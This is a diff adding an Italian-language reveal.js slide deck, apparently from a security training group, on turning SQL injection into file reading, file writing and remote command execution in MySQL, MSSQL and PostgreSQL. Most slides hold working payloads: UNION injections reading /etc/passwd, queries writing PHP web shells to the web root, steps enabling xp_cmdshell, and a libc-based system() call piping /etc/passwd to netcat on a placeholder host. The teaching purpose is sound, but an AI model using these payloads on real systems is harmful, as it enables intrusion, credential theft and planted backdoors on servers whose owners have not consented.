@@ -1,0 +1,372 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>SQL Injection - Lesson 03 - coppito_zero_day</title>
+
+		<link rel="stylesheet" href="css/reset.css">
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/coppito-zero-day.css">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/monokai.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<section>
+					<h2>SQL Injection</h2>
+					<h4>LESSON 03</h4>
+				</section>
+				<section>
+					<h2>'FOOTHOLD AND S.O. EXPLOITATION FROM SQL INJECTION</h2>
+					<p>Abbiamo scoperto e sfruttato una SQLi, cos'altro possiamo fare?</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Leggere dal database non ci basta! :D Attraverso alcune tecniche
+						possiamo ottenere un accesso più completo al sistema operativo.
+					</p>
+				</section>
+				<section>
+					<h2>'FOOTHOLD AND S.O. EXPLOITATION FROM SQL INJECTION</h2>
+					<ul>
+						<li class="fragment fade">LFI (Local File Inclusion)<br />
+							Ci permette di leggere file dal sistema operativo.
+						</li>
+						<li class="fragment fade">FILE WRITING<br />
+							Ci permette di scrivere file sul sistema operativo.
+						</li>
+						<li class="fragment fade">RCE (Remote Command Execution)
+							Ci permette di eseguire comandi sul sistema operativo.
+						</li>
+					</ul>
+					<p class="fragment fade">Tutto questo tramite il DATABASE!</p>
+				</section>
+				<section>
+					<h2>'READING FILE IN MySQL</h2>
+					<br /><br />
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+CREATE TABLE `users` (user char(50));
+LOAD DATA INFILE '/etc/passwd' INTO TABLE `users`;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p><code>LOAD DATA INFILE</code> legge i dati da un file e li inserisce in una tabella.</p>
+					</div>
+					<br /><br />
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT LOAD_FILE('/etc/passwd');
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p><code>LOAD_FILE</code> legge i dati da un file e li restituisce.</p>
+					</div>
+				</section>
+				<section>
+					<h2>'READING FILE IN MySQL</h2>
+					<h4>Limitazioni</h4>
+					<ul>
+						<li class="fragment fade"><code>LOAD DATA INFILE</code> e
+							<code>LOAD_FILE</code> possono essere utilizzati solo se l'utente del DB
+							che esegue i comandi ha il privilegio <code>FILE</code>.
+						</li>
+						<li class="fragment fade">Se la variabile di sistema <code>secure_file_priv</code>
+							è settata possiamo leggere file solo dalla cartella indicata dalla stessa.
+						</li>
+						<li class="fragment fade">Il file che vogliamo leggere deve essere world-readable.</li>
+						<li class="fragment fade">
+							L'argomento passato a <code>LOAD_FILE</code> può essere anche un HEX, come
+							<code>SELECT LOAD_FILE(0x2F6574632F706173737764)</code>, mentre per <code>LOAD DATA INFILE</code>
+							l'argomento deve essere necessariamente una stringa.
+						</li>
+					</ul>
+				</section>
+				<section>
+					<h2>'READING FILE IN MySQL</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+$sql = "SELECT id, title, content FROM pages WHERE id = '" . $_GET['id'] . "'";
+$result = $conn->query($sql);
+while($row = $result->fetch_array()){
+  echo $row['title'];
+}
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET[id] = "1' UNION ALL SELECT 1, LOAD_FILE('/etc/passwd'), 3 -- -"
+								</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT id, title, content FROM pages WHERE id = '1'
+UNION ALL SELECT 1, LOAD_FILE('/etc/passwd'), 3 -- -'
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade" data-markdown>
+						<textarea data-template>
+| title |
+|-------|
+| Title news 1 |
+| Title news 2 |
+| root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br />....<br />john:x:13:13:proxy:/bin:/usr/bin/bash |
+						</textarea>
+					</div>
+				</section>
+				<section>
+					<h2>'READING FILE IN MSSQL</h2>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+CREATE TABLE mydata (line varchar(8000));
+BULK INSERT mydata FROM 'c:\boot.ini';
+SELECT line FROM mydata;
+DROP TABLE mydata;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>
+							<code>BULK INSERT</code> legge i dati da un file e li inserisce in una tabella.<br />
+							Questo comando, combinato con le stacked queries sempre attive in MSSQL, ci permette di leggere un file al volo.
+						</p>
+					</div>
+					<br /><br />
+					<div class="fragment fade">
+						<h4>Limitazioni</h4>
+						<p>Ci serve il permesso <code>ADMINISTER BULK OPERATIONS</code>.</p>
+					</div>
+				</section>
+				<section>
+					<h2>'READING FILE IN POSTGRESQL</h2>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+CREATE TABLE mydata(t text);
+COPY mydata FROM '/etc/passwd';
+SELECT t FROM mydata;
+DROP TABLE mydata;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>
+							<code>COPY</code> ci permette di spostare dati tra una tabella ed un file nel filesystem.<br />
+							Con <code>COPY FROM</code> possiamo prendere il contenuto di un file ed inserirlo in una tabella.
+						</p>
+					</div>
+					<br /><br />
+					<div class="fragment fade">
+						<h4>Limitazioni</h4>
+						<p>Il file da leggere deve essere world-readable.</p>
+					</div>
+				</section>
+				<section>
+					<h2>'WRITING FILE IN MySQL</h2>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT '&lt;?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/backdoor.php';
+SELECT '&lt;?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/backdoor.php';
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p><code>INTO OUTFILE</code> scrive il risultato della query in un file.</p>
+						<p><code>INTO DUMPFILE</code> scrive il risultato della query in un file binario.</p>
+					</div>
+					<br /><br />
+					<div class="fragment fade">
+						<p>Il file da scrivere deve essere world-writable.</p>
+					</div>
+				</section>
+				<section>
+					<h2>'WRITING FILE IN MySQL</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+$sql = "SELECT id, title, content FROM pages WHERE id = '" . $_GET['id'] . "'";
+$result = $conn->query($sql);
+while($row = $result->fetch_array()){
+  echo $row['title'];
+}
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET[id] = "1' AND 1=0 UNION ALL SELECT null, '&lt;?php system($_GET["cmd"])', null
+								INTO OUTFILE '/var/www/backdoor.php' -- -"
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT id, title, content FROM pages WHERE id = '1' AND 1=0
+UNION ALL
+SELECT null,'&lt;?php system($_GET["cmd"])',null INTO OUTFILE '/var/www/backdoor.php' -- -'
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">BOOM! Abbiamo appena creato una backdoor.</div>
+				</section>
+				<section>
+					<h2>'WRITING FILE IN MySQL</h2>
+					<h4>Esempio - note</h4>
+					<br /><br />
+					<ul>
+						<li class="fragment fade">Abbiamo aggiunto <code>AND 1=0</code> per escludere l'output della query originale e mantenere l'output finale pulito.</li>
+						<li class="fragment fade">Per lo stesso motivo abbiamo usato i <code>null</code> invece dei classici numeri.</li>
+						<li class="fragment fade">Dobbiamo conoscere il path assoluto del file che vogliamo scrivere per potervi accedere tramite webserver.</li>
+					</ul>
+				</section>
+				<section>
+					<h2>'WRITING FILE IN MSSQL</h2>
+					<p>Non esiste un comando per scrivere direttamente file in MSSQL.</p>
+					<p>Possiamo usare una stored procedure o un trucco che vedremo nel prossimo capitolo.</p>
+				</section>
+				<section>
+					<h2>'WRITING FILE IN POSTGRESQL</h2>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+CREATE TABLE mydata (t text);
+INSERT INTO mydata (t) VALUES ('<? pasthru($_GET[cmd]); ?>');
+COPY mydata (t) TO '/tmp/test.php';
+DROP TABLE mydata;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>
+							Stessa tecnica del file reading.<br />
+							<code>COPY</code> ci permette di spostare dati tra una tabella ed un file nel filesystem.<br />
+							Con <code>COPY TO</code> possiamo prendere il contenuto di una tabella ed inserirlo in un file.
+						</p>
+					</div>
+					<br /><br />
+					<div class="fragment fade">
+						<p>Il file da scrivere deve essere world-writable.</p>
+					</div>
+				</section>
+				<section>
+					<h2>'RCE IN MySQL</h2>
+					<p>Non esiste un comando per eseguire direttamente comandi in MySQL.</p>
+					<p>Possiamo però abusare del file writing e scrivere un file che ci permette di eseguire comandi.</p>
+				</section>
+				<section>
+					<h2>'RCE IN MSSQL</h2>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+EXEC master.dbo.xp_cmdshell 'cmd';
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>Nelle versioni moderne di MSSQL <code>xp_cmdshell</code> è disabilitato di default...ma possiamo attivarlo :D</p>
+					</div>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+EXEC sp_configure 'show advanced options', 1;
+EXEC sp_configure reconfigure;
+EXEC sp_configure 'xp_cmdshell', 1;
+EXEC sp_configure reconfigure;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						Per MSSQL esistono anche altre tecniche per ottenere RCE (cheatsheet: https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/)
+					</div>
+				</section>
+				<section>
+					<h2>'RCE IN POSTGRESQL</h2>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS int
+AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
+SELECT system('cat /etc/passwd | nc IP PORT');
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>Possiamo fare affidamento sulla presenza della LIBC.</p>
+						<p>Dobbiamo conoscere la posizione della libc nel sistema.</p>
+						<p>E' un comando privilegiato (DBA).</p>
+					</div>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec from program 'whoami';
+SELECT * from cmd_exec;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						In alternativa possiamo abusare di <cody>COPY</code>, usando come per File Writing e File Reading una tabella di appoggio.<br />
+						Questo non è un comando privilegiato.
+					</div>
+				</section>
+				<section>
+					<h2>CHALLENGE</h2>
+					<h4>http://167.172.164.187/333/</h4>
+				</section>
+			</div>
+		</div>
+
+		<script src="js/reveal.js"></script>
+
+		<script>
+			// More info about config & dependencies:
+			// - https://github.com/hakimel/reveal.js#configuration
+			// - https://github.com/hakimel/reveal.js#dependencies
+			Reveal.initialize({
+				dependencies: [
+					{ src: 'plugin/markdown/marked.js' },
+					{ src: 'plugin/markdown/markdown.js' },
+					{ src: 'plugin/notes/notes.js', async: true },
+					{ src: 'plugin/highlight/highlight.js', async: true }
+				],
+				slideNumber: false,
+				width: 1600,
+				height: 1000,
+				hash: true,
+				pdfSeparateFragments: false
+			});
+		</script>
+	</body>
+</html>
